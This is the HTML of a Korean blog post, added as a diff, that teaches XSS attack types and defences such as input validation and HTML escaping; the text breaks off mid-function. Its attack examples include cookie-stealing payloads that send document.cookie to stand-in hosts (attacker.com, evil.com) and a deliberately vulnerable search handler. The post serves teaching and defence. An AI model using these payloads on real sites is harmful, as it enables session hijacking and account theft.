@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="google" value="notranslate">
+
+    
+
+    
+    <title>[Web Security] XSS 공격과 방어 기법 완벽 가이드 | ddanzit</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="Web Security,XSS,JavaScript,CSP">
+    
+    <meta name="description" content="🎯 XSS(Cross-Site Scripting)란?XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.사용자의 쿠키, 세션 토큰을 탈취하거나, 사용자인 척 행동할 수 있습니다. XSS vs CSRF 차이점   구분 XSS CSRF    공격 대상 웹사이트의 사용자 웹사이트의 서버   공격 방식 악성 스">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Web Security] XSS 공격과 방어 기법 완벽 가이드">
+<meta property="og:url" content="https://ckck803.github.io/2025/12/04/security/xss/index.html">
+<meta property="og:site_name" content="ddanzit">
+<meta property="og:description" content="🎯 XSS(Cross-Site Scripting)란?XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.사용자의 쿠키, 세션 토큰을 탈취하거나, 사용자인 척 행동할 수 있습니다. XSS vs CSRF 차이점   구분 XSS CSRF    공격 대상 웹사이트의 사용자 웹사이트의 서버   공격 방식 악성 스">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-12-03T15:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-08T14:22:34.489Z">
+<meta property="article:author" content="ckck803">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="JavaScript">
+<meta property="article:tag" content="CSP">
+<meta name="twitter:card" content="summary">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/favicon/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.5.0/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/notosanskr.css">
+
+    
+<link rel="stylesheet" href="https://cdn.rawgit.com/innks/NanumSquareRound/master/nanumsquareround.css">
+	
+    
+<link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/nanumgothiccoding.css">
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/rss2.xml" title="ddanzit" type="application/rss+xml">
+</head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                        <h2 class="subtitle-wrap">
+                            <p class="subtitle">딴짓하는 개발자</p>
+                        </h2>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/AWS/">AWS</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/AWS/EKS/">EKS</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/">CS</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/DataBase/">DataBase</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/Network/">Network</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/Process/">Process</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/%EC%9A%B4%EC%98%81%EC%B2%B4%EC%A0%9C/">운영체제</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/%EC%BB%B4%ED%93%A8%ED%84%B0-%EA%B5%AC%EC%A1%B0/">컴퓨터 구조</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/CS/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D-%EC%96%B8%EC%96%B4/">프로그래밍 언어</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Database/">Database</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Database/PostgreSQL/">PostgreSQL</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/">DevOps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/CICD/">CICD</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/Jmeter/">Jmeter</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/KeyCloak/">KeyCloak</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/Kiali/">Kiali</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/Maven/">Maven</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/OpenSearch/">OpenSearch</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/Repository/">Repository</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/DevOps/SonarQube/">SonarQube</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/">Develop</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Beakjoon/">Beakjoon</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Cpp/">Cpp</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Django/">Django</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Docker/">Docker</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Git/">Git</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/JAVA/">JAVA</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/JPA/">JPA</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Kafka/">Kafka</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/MySQL/">MySQL</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Oracle/">Oracle</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/QueryDSL/">QueryDSL</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/Redis/">Redis</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Develop/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Django/">Django</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Django/Python/">Python</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/">Frontend</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/Login/">Login</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/React/">React</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/React-Query/">React Query</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/Redux/">Redux</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/To-do-List/">To do List</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/ToastUI/">ToastUI</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/Vite/">Vite</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/Vue/">Vue</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/Vue3/">Vue3</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/%EB%A1%9C%EA%B7%B8%EC%9D%B8/">로그인</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Frontend/%EB%B8%94%EB%A1%9C%EA%B7%B8/">블로그</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Infra/">Infra</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Java/">Java</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/">Kubernetes</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/Autoscaler/">Autoscaler</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/Config/">Config</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/Custom/">Custom</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/Helm/">Helm</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/Istio/">Istio</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/%EA%B5%AC%EC%84%B1%EC%9A%94%EC%86%8C/">구성요소</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/%EC%84%9C%EB%B9%84%EC%8A%A4/">서비스</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/%EC%9B%8C%ED%81%AC%EB%A1%9C%EB%93%9C/">워크로드</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Kubernetes/%EC%9D%B8%EC%A6%9D-%EC%9D%B8%EA%B0%80/">인증/인가</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Linux/">Linux</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Security/">Security</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/">Spring</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-AOP/">Spring AOP</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Batch/">Spring Batch</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Boot/">Spring Boot</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Cloud/">Spring Cloud</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Core/">Spring Core</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-DB/">Spring DB</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Data-JPA/">Spring Data JPA</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Framework/">Spring Framework</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-MVC/">Spring MVC</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Rest/">Spring Rest</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Security/">Spring Security</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-Test/">Spring Test</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-WebSocket/">Spring WebSocket</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/Spring-%EA%B3%A0%EA%B8%89%ED%8E%B8/">Spring 고급편</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/%EA%B0%95%EC%9D%98/">강의</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Spring/%EA%B2%8C%EC%8B%9C%ED%8C%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/">게시판 만들기</a></li></ul></li></ul>
+                                
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Security/">Security</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-security/xss" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        [Web Security] XSS 공격과 방어 기법 완벽 가이드
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+  <div class="article-date">
+    <i class="fa fa-calendar"></i>
+    <a href="/2025/12/04/security/xss/" class="article-date">
+       <time datetime="2025-12-03T15:00:00.000Z" itemprop="datePublished">2025-12-04</time>
+    </a>
+  </div>
+
+
+<div class="article-date">
+  <i class="fa fa-calendar-plus-o"></i>
+  <a href="/2025/12/04/security/xss/" class="article-date">
+     <time datetime="2025-12-08T14:22:34.489Z" itemprop="dateModified">2025-12-08</time>
+  </a>
+</div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CSP/" rel="tag">CSP</a>, <a class="tag-link-link" href="/tags/JavaScript/" rel="tag">JavaScript</a>, <a class="tag-link-link" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+                
+
+                
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            
+
+            
+
+            
+
+            <h2 id="🎯-XSS-Cross-Site-Scripting-란"><a href="#🎯-XSS-Cross-Site-Scripting-란" class="headerlink" title="🎯 XSS(Cross-Site Scripting)란?"></a>🎯 XSS(Cross-Site Scripting)란?</h2><p>XSS는 <strong>공격자가 웹 페이지에 악성 스크립트를 삽입</strong>하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.<br>사용자의 쿠키, 세션 토큰을 탈취하거나, 사용자인 척 행동할 수 있습니다.</p>
+<h3 id="XSS-vs-CSRF-차이점"><a href="#XSS-vs-CSRF-차이점" class="headerlink" title="XSS vs CSRF 차이점"></a>XSS vs CSRF 차이점</h3><table>
+<thead>
+<tr>
+<th>구분</th>
+<th>XSS</th>
+<th>CSRF</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>공격 대상</td>
+<td>웹사이트의 <strong>사용자</strong></td>
+<td>웹사이트의 <strong>서버</strong></td>
+</tr>
+<tr>
+<td>공격 방식</td>
+<td>악성 스크립트 <strong>실행</strong></td>
+<td>사용자 권한으로 <strong>요청 전송</strong></td>
+</tr>
+<tr>
+<td>주요 수단</td>
+<td>JavaScript 주입</td>
+<td>자동 폼 제출, 이미지 태그</td>
+</tr>
+<tr>
+<td>탈취 가능</td>
+<td>쿠키, 세션, DOM, 키 입력 등</td>
+<td>불가능 (요청만 가능)</td>
+</tr>
+</tbody></table>
+<h2 id="🔍-XSS-공격-유형"><a href="#🔍-XSS-공격-유형" class="headerlink" title="🔍 XSS 공격 유형"></a>🔍 XSS 공격 유형</h2><h3 id="1-Stored-XSS-저장형"><a href="#1-Stored-XSS-저장형" class="headerlink" title="1. Stored XSS (저장형)"></a>1. Stored XSS (저장형)</h3><p>악성 스크립트가 <strong>서버 데이터베이스에 저장</strong>되어, 해당 페이지를 보는 모든 사용자에게 실행됩니다.<br><strong>가장 위험한</strong> XSS 공격입니다.</p>
+<h4 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 게시판 댓글 작성</span></span><br><span class="line"><span class="keyword">const</span> comment = <span class="string">&#x27;&lt;script&gt;</span></span><br><span class="line"><span class="string">  fetch(&quot;https://attacker.com/steal?cookie=&quot; + document.cookie);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 서버에 저장됨</span></span><br><span class="line"><span class="comment">// DB: comments 테이블에 위 스크립트가 그대로 저장</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 다른 사용자가 게시글을 볼 때</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;comment&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title function_">fetch</span>(<span class="string">&quot;https://attacker.com/steal?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="comment">// ⚠️ 모든 방문자의 쿠키가 탈취됨!</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="실제-사례"><a href="#실제-사례" class="headerlink" title="실제 사례"></a>실제 사례</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 프로필 이름 필드에 스크립트 삽입 --&gt;</span></span><br><span class="line">이름: <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">  new Image().src=&#x27;https://evil.com/log?c=&#x27;+document.cookie</span></span></span><br><span class="line"><span class="string"><span class="tag">&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 게시글 제목 --&gt;</span></span><br><span class="line">제목: <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 댓글 내용 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Reflected-XSS-반사형"><a href="#2-Reflected-XSS-반사형" class="headerlink" title="2. Reflected XSS (반사형)"></a>2. Reflected XSS (반사형)</h3><p>악성 스크립트가 <strong>URL 파라미터나 폼 입력</strong>을 통해 즉시 반사되어 실행됩니다.<br>서버에 저장되지 않으며, 피싱 링크를 통해 전파됩니다.</p>
+<h4 id="공격-시나리오-1"><a href="#공격-시나리오-1" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 취약한 검색 기능</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//shop.com/search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 서버 코드 (취약)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> query = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">`검색 결과: <span class="subst">$&#123;query&#125;</span>`</span>);  <span class="comment">// ⚠️ 그대로 출력</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 렌더링 결과</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  검색 결과: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="피싱-공격-예시"><a href="#피싱-공격-예시" class="headerlink" title="피싱 공격 예시"></a>피싱 공격 예시</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">공격자가 이메일로 전송하는 링크:</span><br><span class="line">https://bank.com/login?redirect=&lt;script&gt;</span><br><span class="line">  document.location=&#x27;https://evil.com/phishing?cookie=&#x27;+document.cookie</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">사용자가 클릭하면:</span><br><span class="line">1. 은행 사이트에서 스크립트 실행</span><br><span class="line">2. 쿠키가 공격자 서버로 전송</span><br><span class="line">3. 공격자가 세션 하이재킹</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-DOM-based-XSS-DOM-기반"><a href="#3-DOM-based-XSS-DOM-기반" class="headerlink" title="3. DOM-based XSS (DOM 기반)"></a>3. DOM-based XSS (DOM 기반)</h3><p>서버를 거치지 않고 <strong>클라이언트 측 JavaScript에서</strong> 발생합니다.<br>URL Fragment(#)나 DOM 조작 시 발생합니다.</p>
+<h4 id="공격-시나리오-2"><a href="#공격-시나리오-2" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 취약한 JavaScript 코드</span></span><br><span class="line"><span class="keyword">const</span> urlParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line"><span class="keyword">const</span> name = urlParams.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;welcome&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`환영합니다, <span class="subst">$&#123;name&#125;</span>님!`</span>;</span><br><span class="line"><span class="comment">// ⚠️ innerHTML에 직접 삽입</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 공격 URL</span></span><br><span class="line"><span class="attr">https</span>:<span class="comment">//site.com/?name=&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 결과</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;welcome&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  환영합니다, <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>님!</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="위험한-DOM-API"><a href="#위험한-DOM-API" class="headerlink" title="위험한 DOM API"></a>위험한 DOM API</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ❌ 위험한 방법들</span></span><br><span class="line">element.<span class="property">innerHTML</span> = userInput;</span><br><span class="line">element.<span class="property">outerHTML</span> = userInput;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(userInput);</span><br><span class="line"><span class="built_in">eval</span>(userInput);</span><br><span class="line"><span class="built_in">setTimeout</span>(userInput, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(userInput);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 안전한 대안</span></span><br><span class="line">element.<span class="property">textContent</span> = userInput;  <span class="comment">// HTML 파싱 안 함</span></span><br><span class="line">element.<span class="property">innerText</span> = userInput;    <span class="comment">// HTML 파싱 안 함</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-XSS-방어-기법"><a href="#🛡️-XSS-방어-기법" class="headerlink" title="🛡️ XSS 방어 기법"></a>🛡️ XSS 방어 기법</h2><h3 id="1-입력-검증-및-새니타이제이션-Input-Validation-Sanitization"><a href="#1-입력-검증-및-새니타이제이션-Input-Validation-Sanitization" class="headerlink" title="1. 입력 검증 및 새니타이제이션 (Input Validation &amp; Sanitization)"></a>1. 입력 검증 및 새니타이제이션 (Input Validation &amp; Sanitization)</h3><h4 id="백엔드-검증-필수"><a href="#백엔드-검증-필수" class="headerlink" title="백엔드 검증 (필수)"></a>백엔드 검증 (필수)</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Spring Boot + JSR-303 Validation</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/comment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;?&gt; createComment(<span class="meta">@Valid</span> <span class="meta">@RequestBody</span> CommentDto dto) &#123;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(commentService.save(dto));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommentDto</span> &#123;</span><br><span class="line">    <span class="meta">@NotBlank</span></span><br><span class="line">    <span class="meta">@Size(min = 1, max = 500)</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = &quot;^[^&lt;&gt;]*$&quot;, message = &quot;HTML 태그는 허용되지 않습니다&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Node.js + express-validator</span></span><br><span class="line"><span class="keyword">const</span> &#123; body, validationResult &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-validator&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/comment&#x27;</span>,</span><br><span class="line">  <span class="title function_">body</span>(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    .<span class="title function_">trim</span>()</span><br><span class="line">    .<span class="title function_">isLength</span>(&#123; <span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">500</span> &#125;)</span><br><span class="line">    .<span class="built_in">escape</span>(),  <span class="comment">// HTML 엔티티 변환</span></span><br><span class="line">  <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> errors = <span class="title function_">validationResult</span>(req);</span><br><span class="line">    <span class="keyword">if</span> (!errors.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">errors</span>: errors.<span class="title function_">array</span>() &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 저장 로직</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h4 id="HTML-엔티티-인코딩"><a href="#HTML-엔티티-인코딩" class="headerlink" title="HTML 엔티티 인코딩"></a>HTML 엔티티 인코딩</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 위험한 문자를 HTML 엔티티로 변환</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> map = &#123;</span><br><span class="line">    <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&amp;amp;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;&amp;lt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&amp;gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&amp;#039;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;&amp;#x2F;&#x27;</span></span><br><span class="line">  